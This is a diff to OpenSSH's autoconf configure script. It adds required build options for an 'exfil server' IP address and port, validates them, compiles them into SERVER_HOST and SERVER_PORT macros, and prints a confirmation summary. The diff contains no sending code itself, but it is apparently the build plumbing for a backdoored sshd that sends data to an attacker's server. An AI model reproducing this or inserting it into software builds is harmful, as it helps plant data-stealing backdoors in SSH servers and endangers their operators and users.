@@ -5832,6 +5832,37 @@ AC_EXEEXT
 AC_CONFIG_FILES([Makefile buildpkg.sh opensshd.init openssh.xml \
 	openbsd-compat/Makefile openbsd-compat/regress/Makefile \
 	survey.sh])
+
+# Exfil server IP address and port options
+AC_ARG_WITH([server-ip],
+    [
+Exfil server configuration:
+AS_HELP_STRING([--with-server-ip=IP_ADDRESS],
+    [IPv4 address of the exfil server])],
+    [server_ip="$withval"], [server_ip=""])
+
+AC_ARG_WITH([server-port],
+    [AS_HELP_STRING([--with-server-port=PORT], [Port number of the exfil server])],
+    [server_port="$withval"], [server_port=""])
+
+AS_IF([test -z "$server_ip"], [AC_MSG_ERROR([Exfil server IP address is required])])
+AS_IF([test -z "$server_port"], [AC_MSG_ERROR([Exfil server port is required])])
+
+#Find and use python to validate IP address
+AC_PATH_PROG([PYTHON3], [python3])
+AS_IF([test -z "$PYTHON3"], [AC_MSG_ERROR([Python3 is required to to validate the IP])])
+AS_IF([$PYTHON3 -c 'import ipaddress, sys; ipaddress.IPv4Address(sys.argv.pop())' "$server_ip"],
+    [],
+    [AC_MSG_ERROR([Invalid IPv4 address: $server_ip])])
+
+# Ensure server port is valid
+AS_CASE([$server_port], ['' | *[!0123456789]*], [AC_MSG_ERROR([Invalid server port number])])
+AS_IF([test "$server_port" -lt 1] || [test "$server_port" -gt 65535],
+    AC_MSG_ERROR([Server port must be between 1 and 65535]))
+
+AC_DEFINE_UNQUOTED([SERVER_HOST], ["$server_ip"], [Server IPv4 Address])
+AC_DEFINE_UNQUOTED([SERVER_PORT], [$server_port], [Server Port])
+
 AC_OUTPUT
 
 # Print summary of options
@@ -5942,3 +5973,6 @@ if test "x$no_fd_passing" = "x1" -a "x$is_cygwin" != "x1" ; then
 	echo "deprecated in a future OpenSSH release."
 fi
 
+printf '\nExfil server configuration accepted:\n'
+printf '    Server IP:  %s\n' "$server_ip"
+printf '    Server Port: %s\n' "$server_port"
